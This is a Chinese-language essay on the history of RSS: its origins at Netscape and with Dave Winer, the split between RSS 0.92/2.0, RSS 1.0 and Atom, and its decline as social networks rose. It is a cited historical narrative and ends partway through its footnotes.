<p>时间回到上世纪 90 年代末，那是一个介于 Netscape 上市和互联网泡沫破灭之间的狂飙突进的年代。所有人都预感到，互联网将掀起比以往更巨大的浪潮，尽管没人能确切说出浪潮将涌向何方。当时有一种流行的理论：内容整合 (syndication) 将彻底改变整个 Web。最初，Web 的设计只是为了实现一次简单的双方交易——客户端从一台主机服务器上获取一份文档。但新的标准将打破这一模式，它允许人们将整个网站的内容重新打包，通过五花八门的渠道再次分发。Kevin Werbach 在当时极具投资者影响力的时事通讯 <em>Release 1.0</em> 中预言，内容整合“将演化为互联网经济的核心模型，让企业和个人既能掌控自己的线上形象，又能享受到巨大规模和范围带来的红利。”<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<p>他邀请读者想象这样一幅未来图景：一位击剑爱好者想买一把新重剑，他不必再访问“在线体育用品商店”或“击剑器材零售商”的网站，而是可以直接在他最喜欢的击剑主题网站上，通过嵌入的电子商务插件完成购买。<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> 这就像电视界的大型电视网将节目授权给地方小电视台播放一样，Web 上的内容整合能让商家和媒体通过无数个中间站点触达消费者。而这自然也意味着，消费者将获得前所未有的控制权，可以自由选择在何时、何地、以何种方式与商家或媒体互动。</p>
<p>RSS，正是当年被寄予厚望、能够实现这一“整合未来”的标准之一。在 Werbach 看来，RSS 是“轻量级内容整合协议的杰出代表”。<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> 同一时期的另一篇文章则称 RSS 是首个真正发挥出 XML 潜力的协议。<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup> 无论是普通用户还是内容聚合平台，都可以利用它，从浩如烟海的 Web 信息中打造出属于自己的个性化频道。然而二十年过去了，社交媒体巨头崛起，Google Reader 也被送进了坟墓，RSS 似乎成了一项 <a href="https://trends.google.com/trends/explore?date=all%5c&amp;geo=US%5c&amp;q=rss">日渐式微的技术</a>，如今只有播客作者、技术博主和少数记者还在使用它。当然，还是有一小撮人顽固地坚守着 RSS 阅读器。但在 2018 年的今天，给自己的博客加上 RSS 订阅选项，本身就是一种政治姿态。那个小小的橙色图标，已经成为一个怀旧的符号，象征着对那个由少数几家公司控制的中心化网络的无声反抗——这个网络，与 Werbach 当年想象的整合世界，早已判若云泥。</p>
<p>RSS 的未来曾一片光明。到底发生了什么？它的衰落是历史的必然，还是那场阻碍其标准统一的激烈内斗加速了它的灭亡？</p>
<h2 id="浑水">浑水</h2>
<p>RSS 其实被发明了两次。这意味着它从未有过一个明确的“主人”，这种权责不清的局面引发了无尽的争论和敌意。但这也恰恰说明，RSS 是一个顺应时代潮流的重要思想。</p>
<p>1998 年，Netscape 正挣扎于生死存亡之秋，苦苦思索着公司的未来。它的旗舰产品——曾占据超过 80% 市场份额的 Netscape Navigator 浏览器——正被 Microsoft 的 Internet Explorer 迅速蚕食。于是，Netscape 决定开辟新战场。当年 5 月，公司集结了一个团队，启动了内部代号为“60号项目”的计划。<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> 两个月后，Netscape 推出了名为“My Netscape”的门户网站，意图与 Yahoo、MSN 和 Excite 等当时的门户巨头一较高下。</p>
<p>第二年三月，Netscape 为 My Netscape 门户网站增加了一项新功能，名为“My Netscape Network”。用户可以在自己的 My Netscape 页面上进行个性化定制，添加来自全网各大站点的“频道”，展示最新的头条新闻。只要你喜欢的网站按照 Netscape 的规定格式发布一个特殊文件，你就能把它添加到你的 My Netscape 页面上。通常，参与的网站会在页面上放置一个“添加频道”的按钮，用户点击一下，一个包含最新链接标题的小窗口就会出现在他们的门户页上。</p>
<p><img src="https://s1.ax1x.com/2018/09/22/iupTPJ.gif" alt="一个 My Netscape Network 频道"></p>
<p><em>图注：一个 Mozilla.org 的 My Netscape Network 频道，在用户即将把它添加到 My Netscape 页面时大概就是这个样子。</em></p>
<p>网站们需要发布的那个特殊文件，就是一个 RSS 文件。在 My Netscape Network 的发布公告中，Netscape 解释说 RSS 是“RDF 站点摘要” (RDF Site Summary) 的缩写。<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup> 这个名字其实有点误导人。RDF，即资源描述框架 (Resource Description Framework)，本质上是一种用来描述任意资源属性的语法。(如果你对此很感兴趣，可以读读我那篇关于 <a href="/2018/05/27/semantic-web.html">语义网 (Semantic Web) 的文章</a>。) 1999 年，万维网联盟 (W3C)——Web 世界的主要标准制定机构——正在审议 RDF 的规范草案。尽管 RSS 号称基于 RDF，但 Netscape 发布的示例文件里却根本没用任何 RDF 标签。RSS 规范的作者之一 Dan Libby 在一份配套文档中解释说：“在 MNN 的这个版本里，Netscape 有意限制了 RSS 格式的复杂性。”<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup> 该规范的版本号被定为 0.90，言下之意是，后续版本会让 RSS 逐渐向 W3C 的 XML 规范和不断演进的 RDF 规范草案看齐。</p>
<p>RSS 是由 Libby 和另外两位 Netscape 员工 Eckart Walther、Ramanathan Guha 共同创造的。根据 Guha 在邮件中的回忆，最初是他和 Walther 在 Libby 的一些建议下捣鼓出了 RSS 的雏形。1998 年 AOL 收购 Netscape 后，他和 Walther 相继离开，RSS 的后续发展就落到了 Libby 肩上。在加入 Netscape 之前，Guha 曾在 Apple 公司工作，并提出了一个名为“元内容框架” (Meta Content Framework, MCF) 的概念。MCF 是一种用来表示元数据 (metadata) 的格式，无论是网页还是本地文件，它都能描述。为了展示其威力，Guha 开发了一款名为 <a href="http://web.archive.org/web/19970703020212/http://mcf.research.apple.com:80/hs/screen_shot.html">HotSauce</a> 的应用，能将文件间的关系以三维空间中悬浮的节点网络形式可视化。离开 Apple 加入 Netscape 后，Guha 立即与一位名叫 Tim Bray 的顾问合作。Bray 在博客中提到，他和 Guha 最终做出了一个基于 XML 的 MCF 版本，而这个版本又成了 W3C 的 RDF 草案的基础。<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup> 毫无疑问，Guha、Walther 和 Libby 都希望能延续 Guha 此前的工作，将 RDF 融入 RSS。但 Libby 后来写道，由于时间紧迫，加上当时普遍认为 RDF 对“普通用户”来说“太复杂”，最初那个基于 RDF 的宏大构想最终被打了折扣。<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup></p>
<p>就在 Netscape 投身于后来被称为“门户大战”的流量争夺战时，一种名为“网络日志” (weblogging) 的新事物正在 Web 的另一角悄然兴起。<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup> Dave Winer 便是其中的一位先驱。他是 UserLand Software 公司的 CEO，这家公司开发的早期内容管理系统，让许多不精通技术的人也能轻松写博客。Winer 自己也运营着一个博客，名为 <a href="http://scripting.com">Scripting News</a>，至今仍是互联网上最古老的博客之一。早在 Netscape 发布 My Netscape Network 的一年多前，即 1997 年 12 月 15 日，Winer 就宣布他的博客将同时提供 XML 和 HTML 两种格式。<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup></p>
<p>Dave Winer 的这种 XML 格式后来被称为 Scripting News 格式。据说它和 Microsoft 的“频道定义格式” (Channel Definition Format, 一种在 1997 年 3 月提交给 W3C 的“推送技术”标准) 很相似，但我没能找到原始文件来证实这一点。<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup> 和 Netscape 的 RSS 一样，它也将 Winer 博客的内容结构化，以便其他软件能够理解。当 Netscape 发布 RSS 0.90 后，Winer 和他的 UserLand Software 公司开始同时支持这两种格式。但 Winer 认为 Netscape 的格式“严重不足”，并且“缺少了网站作者和读者最需要的东西”。<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup> Netscape 的格式只能呈现一个链接列表，而 Scripting News 格式却能呈现一系列段落，每个段落里还可以包含一个或多个链接。</p>
<p>1999 年 6 月，也就是 Netscape 宣布 My Netscape Network 两个月后，Winer 推出了 Scripting News 格式的新版本——ScriptingNews 2.0b1。Winer 声称，他之所以决定自己动手，是因为他曾试图让 Netscape 的人关注 RSS 0.90 的缺陷，但却无人理睬。<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup> 新版的 Scripting News 格式在 <code>&lt;header&gt;</code> 元素中增加了几项，使其在功能上与 RSS 看齐。但两者依然存在一个关键区别：Winer 戏称为“胖”整合格式的 Scripting News，可以包含完整的段落，而不仅仅是链接。</p>
<p>Netscape 紧接着在下个月就发布了 RSS 0.91。这次的更新堪称一次 180 度大转弯。RSS 不再是“RDF 站点摘要”的缩写，而是变成了“丰富站点摘要”。所有的 RDF 元素——本来也几乎没有——被悉数移除，同时吸收了许多 Scripting News 格式的标签。在新规范的说明中，Libby 这样解释：</p>
<blockquote>
<p>RDF 相关引用已被移除。RSS 最初的构想是作为一种提供网站摘要的元数据格式。但现在两点已经很明确：首先，内容提供者更需要的是一种内容整合格式，而非元数据格式。RDF 文件的结构非常严谨，必须遵循 RDF 数据模型才能生效，这对人类来说不易理解，也让创建有用的 RDF 文件变得困难。其次，市面上几乎没有可用于生成、验证和处理 RDF 的工具。基于这些原因，我们决定采用标准的 XML 方式。<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup></p>
</blockquote>
<p>Winer 对 RSS 0.91 极为满意，称其“比我预想的还要好”。<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup> UserLand Software 公司随即采用它取代了自家的 ScriptingNews 2.0b1 格式。在当时看来，RSS 似乎终于有了一份统一的、权威的规范。</p>
<h2 id="大分裂">大分裂</h2>
<p>一年之后，RSS 0.91 规范也显得捉襟见肘了。人们想用 RSS 做各种各样的事情，但规范却无法满足需求。规范中的某些限制也显得毫无必要——比如，每个 RSS 频道最多只能包含 15 个项目。</p>
<p>到那时，已经有更多的组织采纳了 RSS。除了在 0.91 版本后就似乎兴味索然的 Netscape，牌桌上的主要玩家包括 Dave Winer 的 UserLand Software、运营着 RSS 聚合器 Meerkat 的 O’Reilly Net，以及同样运营着新闻类 RSS 聚合器的 Moreover.com。<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup> 这些组织的代表们通过邮件列表，定期讨论如何改进 RSS 0.91。但在改进的方向上，他们之间存在着深刻的分歧。</p>
<p>这场讨论主要发生在一个名为“整合” (Syndication) 的邮件列表里。<a href="https://groups.yahoo.com/neo/groups/syndication/info">该邮件列表的存档</a> 至今仍可访问，是一份惊人的历史资料。它逐分逐秒地记录了这些深刻的分歧最终如何撕裂了整个 RSS 社区。</p>
<p>站在这场分裂风暴一侧的，是 Winer。他迫切地想要推动 RSS 的演进，但只希望以一种相对保守的方式进行。2000 年 6 月，他在 UserLand 网站上发布了自己版本的 RSS 0.91 规范，作为后续开发的起点。这个版本与 Netscape 发布的 0.91 规范相比，并无重大改动。Winer 在一篇配套的博客文章中声称，这只是一次“清理”工作，旨在记录 RSS 在实际应用中的情况，因为 Netscape 的官方规范已经无人维护。<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup> 在同一篇文章中，他坚称 RSS 之所以成功，关键在于其简单性。他认为，如果在格式中重新加入命名空间 (namespaces，一种区分不同 RSS 词汇的方式) 或 RDF——这是邮件列表里一些人的提议——将会“使其变得极其复杂，恕我直言，对于内容提供者来说，这种复杂性几乎带不来任何好处。” 在差不多同一时间发给“整合”邮件列表的一封邮件中，Winer 暗示这些分歧非常严重，甚至可能导致他另起炉灶：</p>
<blockquote>
<p>我仍在思考如何推动 RSS 向前发展。我非常希望在 RSS2 中加入类似 ICE 的功能，发布和订阅是我的重中之重，但我会为了保持简单性而斗争到底。我喜欢可选元素。我不想走上命名空间和模式 (schema) 的道路，也不想把它变成 RDF 的一种方言。我理解其他人想这么做，所以，我猜我们最终会走向分裂 (fork)。对于另一条路会通向何方，我有自己的看法，但至少现在，我会保留这些看法。<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup></p>
</blockquote>
<p>与 Winer 对立的是另外几位人物，包括 O’Reilly 的 Rael Dornfest、搜索创业公司 Calaba 的负责人 Ian Davis，以及一位年仅 14 岁的早慧少年 Aaron Swartz。没错，就是后来共同创办了 Reddit 并以其黑客行动主义闻名的那个 Aaron Swartz。(据 Davis 在邮件中回忆，2000 年时，他父亲还经常陪他参加技术圈的聚会。) Dornfest、Davis 和 Swartz 都认为，为了满足五花八门的应用需求，RSS 必须引入命名空间。在 O’Reilly 主持的另一个邮件列表里，Davis 提出了一个基于命名空间的模块化系统，他写道，这样的系统能“让 RSS 随心所欲地扩展，而不是硬塞进各种新功能，把规范搞得越来越复杂。”<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup> “命名空间阵营”相信，RSS 的用途很快将远不止于聚合博客文章，因此，命名空间非但不是累赘，反而是防止 RSS 在支持越来越多用例后变得难以管理的唯一出路。</p>
<p>对命名空间的分歧，其根源在于对 RSS 究竟为何物这一根本问题的不同理解。Winer 当初发明 Scripting News 格式，是为了聚合自己博客的文章。Netscape 发布 RSS 时称其为“RDF 站点摘要”，是想在 My Netscape 门户里微缩式地重建一个个网站。有些人觉得，应该尊重 Netscape 最初的愿景。Davis 在给“整合”邮件列表的信中阐述了他的观点：RSS“最初的构想是用来建立迷你版的网站地图”，而现在，他和同伴们希望扩展 RSS，“使其能包含新闻标题之外更多类型的信息，并满足过去 12 个月里涌现出的新用途。”<sup id="fnref:21"><a href="#fn:21" class="footnote-ref" role="doc-noteref">21</a></sup> 这个观点不无道理，因为 Netscape 的 RSS 项目最初的目标甚至比 Davis 描述的还要宏大：Guha 曾告诉我，他想创造一种技术，不仅能支持网站频道，还能支持关于任意实体 (比如歌手麦当娜) 的信息源。从这个角度看，进一步发展 RSS 以实现这一目标，确实符合其初衷。但 Davis 的论点也夸大了 Netscape 在发布 RSS 规范时内部愿景的统一程度。据我与 Libby 的邮件交流，即便在 Netscape 内部，最终也分裂为“我们来构建语义网吧”和“我们把它做得简单点，方便大家用”两个派别。</p>
<p>而 Winer 则认为，Netscape 最初的目标根本不重要，因为他的 Scripting News 格式才是 RSS 的鼻祖，且其初衷截然不同。鉴于 RSS 开发的核心参与者们在“谁创造了 RSS”以及“为何创造”这两个根本问题上都无法达成一致，分裂似乎已在所难免。</p>
<p>当 Dornfest 宣布了一份提议中的 RSS 1.0 规范，并组建了 RSS-DEV 工作组来筹备发布时，分裂最终发生了。这个工作组里有 Davis、Swartz 和其他几位成员，但没有 Winer。在提议的规范中，RSS 的全称又变回了“RDF 站点摘要”，因为 RDF 被重新引入，用于表示某些 RSS 元素的元数据属性。规范指名道姓地感谢了 Winer，称赞他通过“传道式”的热情推广了 RSS。<sup id="fnref:22"><a href="#fn:22" class="footnote-ref" role="doc-noteref">22</a></sup> 但规范也指出，RSS 不能按照 Winer 倡导的方式去改进。仅仅向 RSS 添加更多元素，而不通过模块系统提供可扩展性，将“牺牲其可伸缩性 (scalability)”。规范接着定义了一套基于 XML 命名空间的 RSS 模块系统。</p>
<p>Winer 觉得 RSS-DEV 工作组擅自取名“RSS 1.0”是“不公平的”。<sup id="fnref:23"><a href="#fn:23" class="footnote-ref" role="doc-noteref">23</a></sup> 在另一个关于去中心化的邮件列表里，他写道自己“最近有个标准被一个大牌给偷了”，矛头直指召集了 RSS-DEV 工作组的 O’Reilly。<sup id="fnref:24"><a href="#fn:24" class="footnote-ref" role="doc-noteref">24</a></sup> “整合”邮件列表里的其他成员也认为，在社区就 RSS 的未来达成一致之前，RSS-DEV 工作组不该使用“RSS”这个名字。但工作组坚持己见。工作组的另一位成员 Dan Brickley 辩护道：“我们提议的 RSS 1.0 牢牢植根于 RSS 的最初愿景，而这一愿景本身可以追溯到 MCF (RDF 的前身) 和其他相关规范 (如 CDF) 的悠久传统。”<sup id="fnref:25"><a href="#fn:25" class="footnote-ref" role="doc-noteref">25</a></sup> 他基本上认为，既然 RDF 本就是 RSS 的一部分，那么 RSS 1.0 的努力比 Winer 更有资格继承“RSS”这个名号。RSS-DEV 工作组在当年 12 月发布了规范的最终版。同月，Winer 在 UserLand 网站上发布了他自己对 RSS 0.91 的改进版，命名为 RSS 0.92。RSS 0.92 对 RSS 做了一些小的、可选的改进，其中就包括了后来被播客界广泛采用的 <code>&lt;enclosure&gt;</code> 标签。至此，RSS 正式分裂。</p>
<p>如果当初能更努力地将 Winer 纳入 RSS-DEV 工作组，这场分裂或许本可避免。他显然是理应在席的。他是“整合”邮件列表的杰出贡献者，对 RSS 的普及功不可没，这一点连工作组成员自己都承认。但正如 Davis 在邮件中所写，Winer“想要控制权，希望 RSS 成为他的个人遗产，所以不愿与我们合作。” O’Reilly 的创始人兼 CEO Tim O’Reilly 在 2000 年 9 月的一个 UserLand 讨论组中解释说，Winer 基本上是拒绝参与合作：</p>
<blockquote>
<p>一群参与 RSS 的人聚在一起，开始思考它的未来发展。Dave 也是其中一员。但当团队的共识转向了他不喜欢的方向时，Dave 就退出了，并把这描绘成 O’Reilly 企图从他手中夺取 RSS 的阴谋，尽管 O’Reilly 的 Rael Dornfest 只是 RSS 1.0 提案的十几位作者之一，而且许多参与开发的成员在 RSS 领域的资历至少和 Dave 一样长。<sup id="fnref:26"><a href="#fn:26" class="footnote-ref" role="doc-noteref">26</a></sup></p>
</blockquote>
<p>对此，Winer 回应道：</p>
<blockquote>
<p>在他们宣布的两周前，我见了 Dale [Dougherty]，他压根没提要叫 RSS 1.0。在宣布前的那个周五，我和 Rael 通了电话，他也只字未提他们要叫它 RSS 1.0。我是直到公之于众时才第一次听说。</p>
<p>让我直接问你一个问题。如果事实证明，将新规范命名为“RSS 1.0”的计划是私下决定的，没有任何事先通知或协商，也没给‘整合’邮件列表的成员们——不只是我——任何同意或反对的机会，你打算怎么办？</p>
<p>UserLand 为了创造、推广和支持 RSS 付出了巨大努力。我们放弃了这些，让你们的人拿走了这个名字。这是最根本的问题。如果我今后想在 Web 整合领域做任何事，我都得用一个新名字。Tim，这到底是为什么，又是怎么发生的？<sup id="fnref:27"><a href="#fn:27" class="footnote-ref" role="doc-noteref">27</a></sup></p>
</blockquote>
<p>我没能在“整合”邮件列表的存档中找到任何在 RSS 1.0 提案公布前关于命名问题的讨论。Winer 在给我的消息中表示，他并非想控制 RSS，只是想在自己的产品里使用它。</p>
<p>2003 年，RSS 再次分裂。几位对 RSS 社区无休止的争吵感到厌倦的开发者，试图创造一种全新的格式。他们创造了 Atom，一种摒弃了 RDF 但拥抱了 XML 命名空间的格式。Atom 最终由 <a href="https://tools.ietf.org/html/rfc4287">一项提议的 IETF 标准</a> 进行了规范。Atom 诞生后，市面上出现了三个相互竞争的 RSS 版本：Winer 的 RSS 0.92 (于 2002 年升级为 RSS 2.0，并更名为“真正简单的整合”)、RSS-DEV 工作组的 RSS 1.0，以及 Atom。</p>
<h2 id="衰落">衰落</h2>
<p>多个 RSS 规范并存的局面，可能从其他方面也阻碍了 RSS 的发展，这一点我稍后会谈到。但这并没能阻止 RSS 在 21 世纪的头十年里风靡一时。到 2004 年，《纽约时报》开始用 RSS 提供头条新闻，并专门刊文向普通读者解释什么是 RSS 以及如何使用它。<sup id="fnref:28"><a href="#fn:28" class="footnote-ref" role="doc-noteref">28</a></sup> 2005 年，最终拥有数百万用户的 RSS 聚合器 Google Reader 问世。到 2013 年，RSS 的普及程度似乎让《纽约时报》在为 Aaron Swartz 撰写的讣告中，称其为一项“无处不在”的技术。<sup id="fnref:29"><a href="#fn:29" class="footnote-ref" role="doc-noteref">29</a></sup> 曾几何时，在地球上三分之一的人口注册 Facebook 之前，RSS 就是许多人获取互联网新闻的主要方式。</p>
<p>《纽约时报》发表 Swartz 讣告是在 2013 年 1 月。但实际上，RSS 在那时已经盛极而衰，正一步步走向默默无闻。2013 年 7 月，Google Reader 被关闭，官方给出的理由是用户数“连年下滑”。<sup id="fnref:30"><a href="#fn:30" class="footnote-ref" role="doc-noteref">30</a></sup> 此举引发了各大媒体纷纷发文，宣告 RSS 的死亡。但其实，早在 Google Reader 关闭前，唱衰 RSS 的声音就已持续多年。2009 年 5 月，Steve Gillmor 在 TechCrunch 上撰文建议：“是时候彻底告别 RSS，转向 Twitter 了”，因为“RSS 已经跟不上时代了”。<sup id="fnref:31"><a href="#fn:31" class="footnote-ref" role="doc-noteref">31</a></sup> 他指出，Twitter 本质上就是一个更强大的 RSS 源，因为它不仅能推送文章，还能让你看到大家对文章的看法。它让你关注的是“人”，而不仅仅是“频道”。Gillmor 告诉读者，是时候让 RSS 退居幕后了。他以 Bob Dylan《永远年轻》中的一句歌词结束了文章。</p>
<p>今天，RSS 并未消亡。但它也远没有了往日的辉煌。关于 RSS 为何失宠，众说纷纭。其中最有说服力的解释，或许正是 Gillmor 在 2009 年提出的那个。社交网络，和 RSS 一样，为用户提供了一个聚合互联网最新资讯的信息流。社交网络之所以能取而代之，仅仅因为它们是“更好”的信息流。同时，它们也为背后的公司带来了更多利益。例如，有人指责 Google 关闭 Reader 是为了将用户赶向自家的 Google+。Google 也许能从 Google+ 上找到变现模式，但这种模式在 Google Reader 上是绝无可能的。Instapaper 的创始人 Marco Arment 在 2013 年的博客中写道：</p>
<blockquote>
<p>Google Reader 不过是 Facebook 无意间挑起的那场战争的最新牺牲品：一场旨在‘拥有一切’的战争。虽然 Google 在技术上确实‘拥有’Reader，也能利用流经其中的海量新闻和用户关注度数据，但这与其更重要的 Google+ 战略发生了冲突。他们需要每个人都通过 Google+ 来阅读和分享一切，这样才能在广告定位数据、广告收入、用户增长和市场影响力上与 Facebook 抗衡。<sup id="fnref:32"><a href="#fn:32" class="footnote-ref" role="doc-noteref">32</a></sup></p>
</blockquote>
<p>所以，无论是用户还是科技公司，都发现从社交网络中获得的价值远超 RSS。</p>
<p>另一种理论认为，RSS 对普通人来说，门槛一直太高，太过“极客化” (geeky)。即便是当年积极拥抱并向读者推广 RSS 的《纽约时报》，也在 2006 年抱怨说，RSS 是个由“电脑极客”发明的“不怎么用户友好”的缩写。<sup id="fnref:33"><a href="#fn:33" class="footnote-ref" role="doc-noteref">33</a></sup> 在 2004 年那个橙色的 RSS 图标诞生之前，《纽约时报》等网站用来链接其 RSS 源的，是一个标着“XML”的小方块，这足以吓退大部分普通用户。<sup id="fnref:34"><a href="#fn:34" class="footnote-ref" role="doc-noteref">34</a></sup> 不过这个标签倒是完全准确，因为在那个年代，点开链接，一个倒霉的用户看到的将是一整页天书般的 XML 代码。<a href="https://twitter.com/mgsiegler/status/311992206716203008">这条精彩的推文</a> 精辟地概括了这种观点。普通人从未对使用 RSS 感到自在；它从设计之初就不是面向消费者的技术，使用起来障碍重重；一旦有更好的替代品出现，人们便会毫不犹豫地“跳船”。</p>
<p>如果能得到持续发展，RSS 或许本可以克服这些局限。也许 RSS 可以扩展出新功能，让订阅了同一频道的朋友们能互相分享对某篇文章的看法。也许浏览器能提供更好的原生支持。但是，当 Facebook 这样的公司能够“快速行动，打破常规” (move fast and break things) 时，RSS 的开发者社区却被困在寻求共识的泥潭里。当他们无法就统一标准达成一致时，本可用于改进 RSS 的精力，却被浪费在无休止的重复造轮子上。例如，Davis 告诉我，如果当初“整合”邮件列表的成员们能够妥协协作，Atom 本无诞生的必要，“所有那些整理完善的工作本可以投入到 RSS 中，使其变得更强大。” 所以，如果我们探究 RSS 为何不再流行，最直接的解释是社交网络取代了它。但如果我们再深究一层，问为什么社交网络能取代它，答案或许是：那些试图让 RSS 成功的人们，面临着一个比（比如说）打造一个 Facebook 要困难得多的问题。正如 Dornfest 曾一度在“整合”邮件列表里写道：“目前来看，真正复杂的远非技术实现，而是政治。”<sup id="fnref:35"><a href="#fn:35" class="footnote-ref" role="doc-noteref">35</a></sup></p>
<p>于是，今天我们面对的是一个个信息被中心化平台分割的孤岛。即便如此，Werbach 在 1999 年预见的那种“整合网络”其实已经实现了，只是方式与他设想的大相径庭。毕竟，像 <em>The Onion</em> 这样的媒体，不正是依赖于通过 Facebook 和 Twitter 进行内容分发，就像经典美剧《宋飞正传》在首播结束后依靠电视联播大赚数亿美元一样吗？我问 Werbach 对此有何看法，他基本表示同意。他告诉我，从一个层面看，RSS 显然是失败了，因为它如今“并非博客圈、内容界或信息聚合领域的核心技术”。但从另一个层面看，“整个社交媒体革命，其核心之一就是聚合不同内容与资源的能力”，这与 RSS 的理念以及他最初对整合网络的构想遥相呼应。对 Werbach 而言，“这是 RSS 的遗产，即便它并非构建于 RSS 之上。”</p>
<p>不幸的是，当今 Web 上的内容整合，依旧只能通过那几家巨头渠道进行，这意味着我们没有人能像 Werbach 想象的那样，“保留对我们在线角色的控制”。造成这一局面的原因之一，是司空见惯的商业贪婪——RSS 作为一个开放格式，无法给予科技公司售卖广告所需的数据和流量控制权，因此得不到它们的支持。但更平淡无奇的原因是，构建中心化的信息孤岛，远比设计一个通用的公共标准要容易。达成共识困难重重且耗时漫长，而一旦没有共识，被冷落的开发者便会出走，创造相互竞争的标准。这或许给我们的教训是：如果我们想要一个更好、更开放的 Web，我们必须学会如何更好地与彼此协作，而不是互相拆台。</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Kevin Werbach, “The Web Goes into Syndication,” Release 1.0, July 22, 1999, 1, accessed September 14, 2018, <a href="http://cdn.oreillystatic.com/radar/r1/07-99.pdf">http://cdn.oreillystatic.com/radar/r1/07-99.pdf</a>.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>ibid（同上）.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Werbach, 8.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Peter Wiggin, “RSS Delivers the XML Promise,” Web Review, October 29, 1999, accessed September 14, 2018, <a href="https://people.apache.org/~jim/NewArchitect/webrevu/1999/10_29/webauthors/10_29_99_2a.html">https://people.apache.org/~jim/NewArchitect/webrevu/1999/10_29/webauthors/10_29_99_2a.html</a>.&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Ben Hammersley, RSS and Atom (O’Reilly), 8, accessed September 14, 2018, <a href="https://books.google.com/books?id=kwJVAgAAQBAJ">https://books.google.com/books?id=kwJVAgAAQBAJ</a>.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>“RSS 0.90 Specification,” RSS Advisory Board, accessed September 14, 2018, <a href="http://www.rssboard.org/rss-0-9-0">http://www.rssboard.org/rss-0-9-0</a>.&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>“My Netscape Network Future Directions,” RSS Advisory Board, accessed September 14, 2018, <a href="http://www.rssboard.org/mnn-futures">http://www.rssboard.org/mnn-futures</a>.&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>Tim Bray, “The RDF.net Challenge,” Ongoing by Tim Bray, May 21, 2003, accessed September 14, 2018, <a href="https://www.tbray.org/ongoing/When/200x/2003/05/21/RDFNet">https://www.tbray.org/ongoing/When/200x/2003/05/21/RDFNet</a>.&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>Dan Libby, “RSS: Introducing Myself,” August 24, 2000, RSS-DEV Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/239">https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/239</a>.&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>Alexandra Krasne, “Browser Wars May Become Portal Wars,” CNN, accessed September 14, 2018, <a href="http://www.cnn.com/TECH/computing/9910/04/portal.war.idg/index.html">http://www.cnn.com/TECH/computing/9910/04/portal.war.idg/index.html</a>.&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>Dave Winer, “Scripting News in XML,” Scripting News, December 15, 1997, accessed September 14, 2018, <a href="http://scripting.com/davenet/1997/12/15/scriptingNewsInXML.html">http://scripting.com/davenet/1997/12/15/scriptingNewsInXML.html</a>.&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>Joseph Reagle, “RSS History,” 2004, accessed September 14, 2018, <a href="https://reagle.org/joseph/2003/rss-history.html">https://reagle.org/joseph/2003/rss-history.html</a>.&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>Dave Winer, “A Faceoff with Netscape,” Scripting News, June 16, 1999, accessed September 14, 2018, <a href="http://scripting.com/davenet/1999/06/16/aFaceOffWithNetscape.html">http://scripting.com/davenet/1999/06/16/aFaceOffWithNetscape.html</a>.&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>ibid.&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
